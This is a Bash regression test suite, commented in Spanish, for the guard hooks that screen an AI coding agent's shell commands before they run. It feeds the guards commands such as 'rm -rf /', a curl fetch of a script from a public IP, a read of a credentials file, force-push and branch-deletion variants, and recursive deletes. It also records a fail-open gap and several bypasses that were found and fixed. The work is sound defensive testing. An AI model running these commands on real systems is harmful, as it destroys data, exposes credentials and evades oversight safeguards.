#!/bin/bash
# test_guards.sh — regresión de la cadena PreToolUse (Sentinel, smart_approve,
# secret-guard). Corre contra los ficheros del propio kit, no contra una
# instalación.
#
# SECRET_GUARD_BIN es sobreescribible a propósito: kit/test/test_guards_falsifiability.sh
# lo apunta a un guard neutralizado (`exit 0`) para demostrar que esta suite
# mide comportamiento real y no es una tautología — si el guard se convierte
# en no-op, los casos BLOCK de más abajo deben caer.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"; KIT="$HERE/.."
PY="${PYTHON3:-python3}"
SG="${SECRET_GUARD_BIN:-$KIT/claude/hooks/secret-guard.sh}"
pass=0; fail=0

# smart_approve.py decide BLOCK/ALLOW leyendo permissions.deny de
# $HOME/.claude/settings.json (ver kit/claude/hooks/smart_approve.py). Sin
# ese fichero (p.ej. un runner de CI con HOME limpio) devuelve ALLOW siempre
# y los casos BLOCK de mas abajo (rm -rf /, force push) caen en falso -- la
# suite mediria el HOME de quien la ejecuta, no el repo. Se fabrica un HOME
# de prueba con las mismas reglas deny que distribuye el kit, para que el
# resultado sea el mismo en cualquier maquina.
GUARDS_TEST_HOME=$(mktemp -d)
mkdir -p "$GUARDS_TEST_HOME/.claude"
jq '{permissions: {deny: (.permissions.deny // [])}}' "$KIT/claude/settings.json" \
  > "$GUARDS_TEST_HOME/.claude/settings.json"

run_sentinel() { printf '{"tool_name":"Bash","tool_input":{"command":"%s"}}' "$1" | "$PY" "$KIT/sentinel/sentinel_preflight.py" 2>&1; }
run_smart()    { printf '{"tool_name":"Bash","tool_input":{"command":"%s"}}' "$1" | HOME="$GUARDS_TEST_HOME" "$PY" "$KIT/claude/hooks/smart_approve.py" 2>&1; }
expect() { # $1 desc, $2 salida, $3 BLOCK|ALLOW
  if [ "$3" = BLOCK ]; then echo "$2" | grep -qiE 'deny|blocked' && r=OK || r=FAIL
  else echo "$2" | grep -qiE 'deny|blocked' && r=FAIL || r=OK; fi
  if [ "$r" = OK ]; then pass=$((pass+1)); else fail=$((fail+1)); echo "FAIL: $1"; fi
}
# Calibracion: sentinel_preflight.py no cubre "rm -rf /" (iocs.json dangerous_commands
# no tiene patron rm-rf; eso lo cubren permissions.deny via smart_approve, y los 2
# hooks a retirar). Se testea via run_smart, coherente con el criterio de exito que
# empareja "rm -rf / y force-push" bajo smart_approve tras la reduccion de cadena.
expect "rm -rf raiz bloqueado"        "$(run_smart 'rm -rf /')"                             BLOCK
expect "localhost permitido"           "$(run_sentinel 'curl http://127.0.0.1:8787/health')" ALLOW
expect "comando normal permitido"      "$(run_sentinel 'ls -la /tmp/proyectos')"             ALLOW

# Calibracion: el kit NO distribuye kit/sentinel/iocs.json (a proposito, ver
# docs/05-security.md: filtraria indicadores personales). Sin ese fichero,
# load_iocs() devuelve {} y estos dos checks de Sentinel son un no-op -> ALLOW.
# Si alguien coloca su propio iocs.json (p.ej. copiando iocs.example.json y
# rellenandolo), ambos deben volver a BLOCK. Esto no es una regresion de la
# suite: es el mismo "degradar con elegancia" que doctor.sh reporta como WARN.
if [ -f "$KIT/sentinel/iocs.json" ]; then IOCS_WANT=BLOCK; else IOCS_WANT=ALLOW; fi
expect "IP publica ($([ "$IOCS_WANT" = BLOCK ] && echo con || echo sin) iocs.json)" \
  "$(run_sentinel 'curl http://185.220.101.5/x.sh')" "$IOCS_WANT"
expect "credentials ($([ "$IOCS_WANT" = BLOCK ] && echo con || echo sin) iocs.json)" \
  "$(run_sentinel 'cat ~/.claude/.credentials.json')" "$IOCS_WANT"
expect "force push directo denegado"   "$(run_smart 'git push --force origin main')"         BLOCK
expect "force push compuesto denegado" "$(run_smart 'echo ok && git push -f origin main')"   BLOCK
expect "comando normal en smart"       "$(run_smart 'git status')"                           ALLOW

# Flags cortos AGRUPADOS. `git push -uf origin main` fuerza igual que `--force`, pero no
# contiene "-f" como token suelto: la regex del guard ('-f\b') y los globs deny lo dejaban
# pasar los dos. El agujero estaba justo en la proteccion que el kit anuncia como dura, y
# ninguno de los dos casos de arriba lo tocaba. Se cubren las dos capas por separado
# porque fallaban por separado.
run_blockdc() { printf '{"tool_name":"Bash","tool_input":{"command":"%s"}}' "$1" | HOME="$GUARDS_TEST_HOME" bash "$KIT/claude/hooks/block-dangerous-commands.sh" 2>&1; }
expect "guard: -uf agrupado denegado"     "$(run_blockdc 'git push -uf origin main')"        BLOCK
expect "guard: -fu agrupado denegado"     "$(run_blockdc 'git push -fu origin main')"        BLOCK
expect "guard: --follow-tags NO denegado" "$(run_blockdc 'git push --follow-tags origin v1')" ALLOW
expect "deny-list: -uf agrupado denegado" "$(run_smart 'git push -uf origin main')"          BLOCK
expect "deny-list: -fu agrupado denegado" "$(run_smart 'git push -fu origin main')"          BLOCK

# Huecos de force-push medidos: estos cinco comandos pasaban los CINCO guards. La causa
# no era la lista de patrones sino su ancla: block-dangerous-commands.sh exigia
# `git\s+push` (se rompe con cualquier opcion de git por delante: -C, --git-dir, -c) y
# branch-guard.sh anclaba a '^' (se rompe con un comando encadenado). Los dos ALLOW son
# el contrapeso: un patron independiente de la posicion no puede bloquear un push normal.
run_branchguard() { printf '{"tool_name":"Bash","tool_input":{"command":"%s"}}' "$1" | bash "$KIT/claude/hooks/branch-guard.sh" 2>&1; }
expect "guard: -C antes de push denegado"         "$(run_blockdc 'git -C /home/user/repo push -f origin main')"  BLOCK
expect "guard: refspec + forzado denegado"        "$(run_blockdc 'git push origin +release:release')"            BLOCK
expect "guard: --mirror denegado"                 "$(run_blockdc 'git push --mirror origin')"                    BLOCK
expect "guard: --delete de rama remota denegado"  "$(run_blockdc 'git push origin --delete release')"            BLOCK
expect "guard: --force-with-lease sigue denegado" "$(run_blockdc 'git push --force-with-lease origin feature')"  BLOCK
expect "guard: -C sin forzar NO denegado"         "$(run_blockdc 'git -C /home/user/repo push origin feature')"  ALLOW
expect "branch-guard: master tras cd + && denegado" "$(run_branchguard 'cd /tmp && git push origin master')"     BLOCK
expect "branch-guard: -C antes de push a main denegado" "$(run_branchguard 'git -C /home/user/repo push origin main')" BLOCK
expect "branch-guard: rama de feature NO denegada"  "$(run_branchguard 'git push origin feature/x')"             ALLOW

# Las TRES grafias del borrado de una rama remota. Solo `--delete` estaba cubierta: contra rama
# protegida las otras dos tambien caian, pero por branch-guard.sh (que bloquea por el nombre de
# la rama), asi que medir solo contra `main` daba cobertura completa donde no la habia. Contra
# una rama de feature, `-d` y `:rama` pasaban los cinco guards. Los cuatro ALLOW son el
# contrapeso de los dos patrones nuevos: una d en flags cortos agrupados no puede bloquear
# `--dry-run` ni `-v`, y un dos puntos no puede bloquear un refspec normal.
expect "guard: -d de rama remota denegado"        "$(run_blockdc 'git push -d origin feature-x')"                BLOCK
expect "guard: -qd agrupado denegado"             "$(run_blockdc 'git push -qd origin feature-x')"               BLOCK
expect "guard: :rama (refspec vacio) denegado"    "$(run_blockdc 'git push origin :feature-x')"                  BLOCK
expect "guard: --dry-run NO denegado"             "$(run_blockdc 'git push --dry-run origin feature-x')"         ALLOW
expect "guard: --set-upstream NO denegado"        "$(run_blockdc 'git push --set-upstream origin mi-dev-branch')" ALLOW
expect "guard: refspec HEAD:refs/ NO denegado"    "$(run_blockdc 'git push origin HEAD:refs/heads/feature-x')"   ALLOW
expect "guard: rama llamada desarrollo NO denegada" "$(run_blockdc 'git push origin desarrollo')"                ALLOW
# Falsos positivos medidos de la primera version de esos dos patrones, cuando la valla era la
# misma de las reglas de force (`[^;&|]*`). Los seis se denegaban. Se conservan como sensor
# porque `d` es una letra de flag frecuente y `:` aparece en cualquier refspec: si alguien
# vuelve a ensanchar la valla, estos casos lo dicen. (Comillas simples, no dobles: run_blockdc
# interpola en crudo dentro del JSON y unas dobles harian denegar por payload ilegible.)
expect "guard: substitucion con -d tras 'push' NO denegada"  "$(run_blockdc 'git log --grep push --since=$(date -d yesterday +%F)')" ALLOW
expect "guard: rama push-notifications con -d NO denegada"   "$(run_blockdc 'git branch push-notifications -d')"                    ALLOW
expect "guard: ruta ../push-wt con -d NO denegada"           "$(run_blockdc 'git worktree add ../push-wt -d')"                      ALLOW
expect "guard: push con -o y substitucion NO denegado"       "$(run_blockdc 'git push origin main -o msg=$(date -d yesterday +%F)')" ALLOW
expect "guard: dos puntos en un comentario NO denegado"      "$(run_blockdc 'git push origin main # nota :importante')"             ALLOW
expect "guard: dos puntos entre comillas NO denegado"        "$(run_blockdc "git commit -m 'fix push :bug' && git push")"           ALLOW
# Y que acotar la valla no haya reabierto el encadenado, que es lo que la version amplia si cubria.
expect "guard: -d tras cd && sigue denegado"                 "$(run_blockdc 'cd /tmp && git push -d origin feature-x')"             BLOCK
expect "guard: :rama tras ; sigue denegado"                  "$(run_blockdc 'echo ok; git push origin :feature-x')"                 BLOCK

# Borrado recursivo en forma larga: `rm --recursive --force ruta` no lleva ninguna r ni f
# agrupada tras un guion, y `find /home/... -delete` no emparejaba el patron de find (que
# exigia un separador justo tras / ~ ..). Las dos capas fallaban por separado, asi que se
# cubren por separado.
run_destructive() { printf '{"tool_name":"Bash","tool_input":{"command":"%s"}}' "$1" | CC_BLOCK_LOG="$GUARDS_TEST_HOME/blocked.log" bash "$KIT/claude/hooks/destructive-guard.sh" 2>&1; }
expect "guard: rm --recursive --force denegado"   "$(run_blockdc 'rm --recursive --force /home/usuario/docs')"   BLOCK
expect "guard: rm -r sin forzar NO denegado"      "$(run_blockdc 'rm -r node_modules')"                          ALLOW
expect "destructive: rm forma larga en /home denegado" "$(run_destructive 'rm --recursive --force /home/usuario/docs')" BLOCK
expect "destructive: find -delete bajo /home denegado" "$(run_destructive 'find /home/usuario/docs -delete')"    BLOCK
expect "destructive: find -delete en /tmp NO denegado" "$(run_destructive 'find /tmp/build -delete')"            ALLOW

# El check 4 (find -delete) bloqueaba con exit 2 pero era el unico que no llamaba a
# log_block: el bloqueo ocurria y no quedaba registrado, asi que el log de auditoria daba
# una imagen falsa de lo que el guard habia hecho. Se mide el REGISTRO, no solo el bloqueo,
# y en un log propio: sobre el log compartido este assert pasaria por la linea que deja
# cualquier otro check.
FIND_LOG="$GUARDS_TEST_HOME/find-delete.log"
printf '{"tool_name":"Bash","tool_input":{"command":"find /home/usuario/docs -delete"}}' \
  | CC_BLOCK_LOG="$FIND_LOG" bash "$KIT/claude/hooks/destructive-guard.sh" >/dev/null 2>&1
if grep -q 'BLOCKED: find -delete' "$FIND_LOG" 2>/dev/null; then
  pass=$((pass+1))
else
  fail=$((fail+1)); echo "FAIL: destructive: el bloqueo de find -delete queda en el log de auditoria"
fi

# Las 43 reglas del guard se evaluaban con 43 `echo | grep` (58 ms por llamada, medido);
# ahora la union de todos los patrones se prueba con UN grep y el desglose regla a regla
# solo corre si esa union dispara. Las reglas ASK quedan detras del mismo grep: si la
# union se quedase solo con las DENY, los `ask` desaparecerian en silencio -- fallo en
# abierto que ningun caso BLOCK/ALLOW de arriba notaria, porque `ask` no es ninguno de los
# dos. Este es el unico assert que lo ve.
if run_blockdc 'npm publish' | grep -q '"ask"'; then
  pass=$((pass+1))
else
  fail=$((fail+1)); echo "FAIL: guard: npm publish debe seguir pidiendo confirmacion (ask)"
fi

# Hallazgo de seguridad documentado (no un bug de esta suite): smart_approve.py
# falla ABIERTO si $HOME/.claude/settings.json no existe o no tiene
# permissions.deny -- sin ese fichero, deny_rules queda vacio y todo se
# permite, incluido 'rm -rf /'. Ocurre en una instalacion a medias (kit
# instalado pero settings.json aun no colocado) o si el fichero se borra o
# corrompe. Se fija aqui en vez de esconderlo: este test se ROMPE (deja de
# dar ALLOW) el dia que alguien cierre ese fallo-abierto, y es la senal de
# que hay que venir a actualizarlo, no relajarlo antes de tiempo.
NO_SETTINGS_HOME=$(mktemp -d)
run_smart_no_settings() { printf '{"tool_name":"Bash","tool_input":{"command":"%s"}}' "$1" | HOME="$NO_SETTINGS_HOME" "$PY" "$KIT/claude/hooks/smart_approve.py" 2>&1; }
expect "smart_approve.py sin settings.json falla ABIERTO (permite rm -rf /; ver comentario)" \
  "$(run_smart_no_settings 'rm -rf /')" ALLOW
rm -rf "$NO_SETTINGS_HOME"

# --- secret-guard.sh: guard simple por NOMBRE (Capa 1). El escaneo de
# CONTENIDO vive en la Capa 2 (hooks/git/pre-commit + gitleaks), cubierta en
# test_secret_content_gitleaks.sh.
SG_DIR=$(mktemp -d)
(cd "$SG_DIR" && git init -q && git config user.email t@example.com && git config user.name t)
# jq -n --arg escapes quotes/newlines properly.
run_secret() { (cd "$SG_DIR" && jq -n --arg command "$1" '{tool_input:{command:$command}}' | bash "$SG" 2>&1); }

# 1) credencial de prueba obvia (sk-test-), fichero de eval -> permitido
mkdir -p "$SG_DIR/evals/tasks"
printf 'prompt: sk-test-ABC123\n' > "$SG_DIR/evals/tasks/03-secreto-fuera-del-config.yaml"
expect "secret-guard permite credencial de test (sk-test-)" "$(run_secret 'git add -f evals/tasks/03-secreto-fuera-del-config.yaml')" ALLOW

# 2) .env real -> bloqueado
printf 'SECRET=1\n' > "$SG_DIR/.env"
expect "secret-guard bloquea .env real" "$(run_secret 'git add .env')" BLOCK
rm -f "$SG_DIR/.env" # si no, el chequeo de "-A/." de mas abajo lo ve al probar 3)

# 3) .env.example -> permitido
printf 'SECRET=changeme\n' > "$SG_DIR/.env.example"
expect "secret-guard permite .env.example" "$(run_secret 'git add .env.example')" ALLOW

# 4) nombre contiene "secret" pero sin extension reservada -> permitido
printf 'notas sin nada sensible\n' > "$SG_DIR/my-secret-notes.md"
expect "secret-guard permite nombre 'secret' sin extension reservada" "$(run_secret 'git add my-secret-notes.md')" ALLOW

# 5) .p12 por nombre -> bloqueado (keystore binario, sin firma textual que escanear)
head -c 64 /dev/urandom > "$SG_DIR/secret.p12" 2>/dev/null || printf 'binarydata' > "$SG_DIR/secret.p12"
expect "secret-guard bloquea .p12 por nombre" "$(run_secret 'git add secret.p12')" BLOCK

# 6) .pem por nombre -> bloqueado
head -c 64 /dev/urandom > "$SG_DIR/server.pem" 2>/dev/null || printf 'binarydata' > "$SG_DIR/server.pem"
expect "secret-guard bloquea .pem por nombre" "$(run_secret 'git add server.pem')" BLOCK

# 7) .key por nombre -> bloqueado
head -c 64 /dev/urandom > "$SG_DIR/server.key" 2>/dev/null || printf 'binarydata' > "$SG_DIR/server.key"
expect "secret-guard bloquea server.key por nombre" "$(run_secret 'git add server.key')" BLOCK

# 8) credentials.json por nombre -> bloqueado (anclado: solo el nombre exacto, no
#    cualquier fichero que contenga la subcadena)
printf '{}\n' > "$SG_DIR/credentials.json"
expect "secret-guard bloquea credentials.json por nombre" "$(run_secret 'git add credentials.json')" BLOCK

# 9) git add de un fichero limpio desde un subdirectorio -> no bloquea espuriamente
SUBDIR_ROOT=$(mktemp -d)
(cd "$SUBDIR_ROOT" && git init -q)
mkdir -p "$SUBDIR_ROOT/sub"
printf 'nada sensible aqui\n' > "$SUBDIR_ROOT/sub/note.txt"
SUBDIR_OUT=$(cd "$SUBDIR_ROOT/sub" && jq -n --arg command 'git add note.txt' '{tool_input:{command:$command}}' | bash "$SG" 2>&1)
expect "secret-guard no bloquea espuriamente git add desde un subdirectorio" "$SUBDIR_OUT" ALLOW

# 10) git add -A en un repo con un clon anidado -> no bloquea
NESTED_ROOT=$(mktemp -d)
(cd "$NESTED_ROOT" && git init -q)
mkdir -p "$NESTED_ROOT/vendor/lib"
(cd "$NESTED_ROOT/vendor/lib" && git init -q)
printf 'nada sensible\n' > "$NESTED_ROOT/vendor/lib/file.txt"
NESTED_OUT=$(cd "$NESTED_ROOT" && jq -n --arg command 'git add -A' '{tool_input:{command:$command}}' | bash "$SG" 2>&1)
expect "secret-guard: git add -A con un clon anidado no bloquea" "$NESTED_OUT" ALLOW
rm -rf "$NESTED_ROOT"

# 11) git add de un fichero trackeado con la cadena PASSWORD=... dentro -> no bloquea
#     (eso es responsabilidad de la Capa 2, no de este guard por nombre)
REAL_PW=$(printf '%s' hunter2superSecret)
printf 'DB_PASSWORD=%s\n' "$REAL_PW" > "$SG_DIR/secrets.yaml"
expect "secret-guard: DB_PASSWORD=... en un fichero no bloquea" "$(run_secret 'git add secrets.yaml')" ALLOW

# 12) ancla de "git add" ampliada: cd + && y subshell deben bloquear igual
expect "secret-guard bloquea .pem tras cd + &&" "$(run_secret 'cd /tmp && git add server.pem')" BLOCK

# 13) el "(" anadido a la clase del ancla no debe generar falsos positivos:
#     un "(git add x)" que aparece como TEXTO dentro de un comando que no es
#     en si mismo un git add (aqui, un echo) no debe bloquear
expect "secret-guard no bloquea '(git add x)' como texto de un echo" "$(run_secret 'echo "(git add x)" >> notes.md')" ALLOW

# 13b) el ancla de las extensiones de credencial es fin-de-TOKEN, no fin-de-CADENA:
# un segundo argumento tras el fichero de credencial no debe hacer que el guard
# lo deje pasar. El limite de token ([[:space:]]|$|['")]) no incluye "/", para
# preservar la propiedad anti-subcadena (extension dentro de un nombre de
# DIRECTORIO no debe bloquear).
head -c 32 /dev/urandom > "$SG_DIR/store.p12" 2>/dev/null || printf 'bin' > "$SG_DIR/store.p12"
printf 'nada\n' > "$SG_DIR/otro.txt"
expect "secret-guard bloquea .p12 con un segundo argumento detras" "$(run_secret 'git add store.p12 otro.txt')" BLOCK
expect "secret-guard bloquea .p12 dentro de un subshell" "$(run_secret '(git add store.p12)')" BLOCK
mkdir -p "$SG_DIR/bundle.p12"
printf 'nada\n' > "$SG_DIR/bundle.p12/data"
expect "secret-guard permite .p12 como nombre de directorio (anti-subcadena)" "$(run_secret 'git add bundle.p12/data')" ALLOW
mkdir -p "$SG_DIR/path/to"
printf '{}\n' > "$SG_DIR/path/to/credentials.json"
expect "secret-guard bloquea credentials.json con prefijo de ruta" "$(run_secret 'git add path/to/credentials.json')" BLOCK
expect "secret-guard bloquea .p12 solo (control)" "$(run_secret 'git add store.p12')" BLOCK

rm -rf "$SUBDIR_ROOT"

# 14) la Capa 2 (hooks/git/pre-commit + .gitleaks.toml) se pierde en silencio
# si cualquiera de los dos deja de ir dentro del kit, sin que ningun test lo
# note -- este assert fija que ambos se sigan distribuyendo, ejecutables.
if [ -x "$KIT/claude/hooks/git/pre-commit" ] && [ -f "$KIT/claude/.gitleaks.toml" ]; then
  pass=$((pass+1))
else
  fail=$((fail+1)); echo "FAIL: la Capa 2 (hooks/git/pre-commit + .gitleaks.toml) se distribuye en el kit"
fi

# 15) modo de los hooks: settings.json los invoca por RUTA DIRECTA, asi que un *.sh
# versionado como 100644 devuelve rc=126 en cada arranque de sesion de cualquier
# instalacion de terceros. Le paso a preflight.sh, el unico de los nueve sin el bit, y
# ningun test lo veia. Se comprueba el modo REGISTRADO en git y no solo el del disco: el
# checkout de un tercero reproduce lo que diga el indice, no el chmod local de nadie.
mode_fail=0
while IFS= read -r hook; do
  [ -x "$hook" ] || { echo "FAIL: hook no ejecutable en disco: $hook"; mode_fail=1; }
done < <(find "$KIT/claude/hooks" -name '*.sh')
if git -C "$KIT" rev-parse --is-inside-work-tree >/dev/null 2>&1; then
  NOT_755=$(git -C "$KIT" ls-files -s -- 'claude/hooks/*.sh' | awk '$1 != "100755" {print $4}')
  [ -z "$NOT_755" ] || { echo "FAIL: hooks *.sh versionados sin bit de ejecucion: $NOT_755"; mode_fail=1; }
fi
if [ "$mode_fail" -eq 0 ]; then pass=$((pass+1)); else fail=$((fail+1)); fi

rm -rf "$SG_DIR"
rm -rf "$GUARDS_TEST_HOME"
echo "PASS=$pass FAIL=$fail"; [ $fail -eq 0 ]
